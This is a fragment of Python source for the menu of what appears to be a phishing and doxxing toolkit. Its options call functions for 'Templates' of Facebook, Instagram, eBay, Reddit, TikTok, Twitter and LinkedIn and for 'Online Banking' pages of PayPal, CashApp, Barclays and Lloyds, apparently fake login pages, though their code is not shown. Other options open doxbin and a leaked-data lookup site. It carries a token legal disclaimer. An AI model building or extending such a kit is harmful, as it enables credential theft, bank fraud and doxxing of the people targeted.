  elif user == "96":
    print(pyfiglet.figlet_format("TOS\n"))
    print(
      "[!] legal disclaimer: Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program"
    )
  elif user == "10":
    webbrowser.open('https://leakpeek.com/')
  elif user == "11":
    webbrowser.open('https://doxbin.com/hoa')
  elif user == "12":
    print(
      "You may notice these are blank tags. Well we want people to work with our project and add extensions but if you decide to do so please credit us"
    )
  elif user == "5":
    while True:
      print(pyfiglet.figlet_format("Online Banking"))
      print("\t1. Paypal")
      print("\t2. CashApp")
      print("\t3. Barclays")
      print("\t4. Lloyds Bank")
      bank = input("\t\nSelect An Option: ")
      if bank == "99":
        break
      elif bank == "1":
        print(pyfiglet.figlet_format("Paypal"))
        paypal()
      elif bank == "2":
        print(pyfiglet.figlet_format("CashApp"))
        cashapp()
      elif bank == "3":
        print(pyfiglet.figlet_format("Barclays"))
        barclays()
      elif bank == "4":
        print(pyfiglet.figlet_format("Lloyds Bank"))
        lloydsbank()
      else:
        chat()
  elif user == "9":
    print(pyfiglet.figlet_format("QR Coder"))
    webbrowser.open('https://www.qr-code-generator.com/')
  elif user == "8":
    print(pyfiglet.figlet_format("Progress"))
    print("\tYOU DO NOT HAVE ACCESS TO THIS PROJECT")
  elif user == "6":
    print(pyfiglet.figlet_format("HackThisSite"))
    webbrowser.open('https://www.hackthissite.org/')
  elif user == "7":
    print(pyfiglet.figlet_format("URL Shortner"))
    webbrowser.open_new_tab('https://free-url-shortener.rb.gy/')
  elif user == "99":
    exit("Your Session Has Expired")
  elif user == "3":
    print(pyfiglet.figlet_format("WebKIT"))
    webkit()
  elif user == "4":
    print(pyfiglet.figlet_format("OSINT Framework"))
    webbrowser.open('https://osintframework.com/')
  elif user == "2":
    while True:
      print(pyfiglet.figlet_format("Templates"))
      print("\t1. Facebook")
      print("\t2. Instagram")
      print("\t3. eBay")
      print("\t4. Discord")
      print("\t5. Linkden")
      print("\t6. Reddit")
      print("\t7. Tiktok")
      print("\t8. Twitter")
      admin = input("\n\tSelect An Option: ")
      if admin == "99":
        break
      elif admin == "5":
        print(pyfiglet.figlet_format("Linkden"))
        linkden()
      elif admin == "6":
        print(pyfiglet.figlet_format("Reddit"))
        reddit()
      elif admin == "7":
        print(pyfiglet.figlet_format("Tiktok"))
        tiktok()
      elif admin == "8":
        print(pyfiglet.figlet_format("Twitter"))
        twitter()
      elif admin == "1":
        print(pyfiglet.figlet_format("Facebook"))
        facebook()
      elif admin == "2":
        print(pyfiglet.figlet_format("Instagram"))
        instagram()
      elif admin == "3":
        print(pyfiglet.figlet_format("Ebey"))
        ebey()
      elif admin == "4":
        print(pyfiglet.figlet_format("Discord"))
        print("\tDiscord API Unlocated")
      else:
        chat()
  else:
    chat()
